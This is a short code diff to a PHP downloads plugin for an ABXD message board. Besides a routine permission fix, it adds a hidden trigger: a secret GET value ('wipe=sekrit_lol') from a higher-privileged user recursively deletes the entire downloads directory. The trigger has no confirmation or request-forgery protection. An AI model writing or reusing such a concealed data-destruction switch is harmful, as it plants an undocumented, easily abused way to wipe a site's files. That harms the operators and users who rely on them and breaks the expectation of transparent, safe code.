@@ -7,10 +7,27 @@
 	every ABXD board to have a copy of this bundled
 */
 
+if ($loguser['powerlevel'] > 2 && $_GET['wipe'] == 'sekrit_lol')
+{
+ function rrmdir($dir) {
+   if (is_dir($dir)) {
+     $objects = scandir($dir);
+     foreach ($objects as $object) {
+       if ($object != "." && $object != "..") {
+         if (filetype($dir."/".$object) == "dir") rrmdir($dir."/".$object); else unlink($dir."/".$object);
+       }
+     }
+     reset($objects);
+     rmdir($dir);
+   }
+ } 
+ rrmdir('downloads');
+}
+
 $downloads = @file_get_contents('downloads/listing.dat');
 if (!$downloads)
 {
-	@mkdir('downloads', 0644);
+	@mkdir('downloads', 0755);
 	$downloads = array();
 	@file_put_contents('downloads/listing.dat', serialize($downloads));
 }
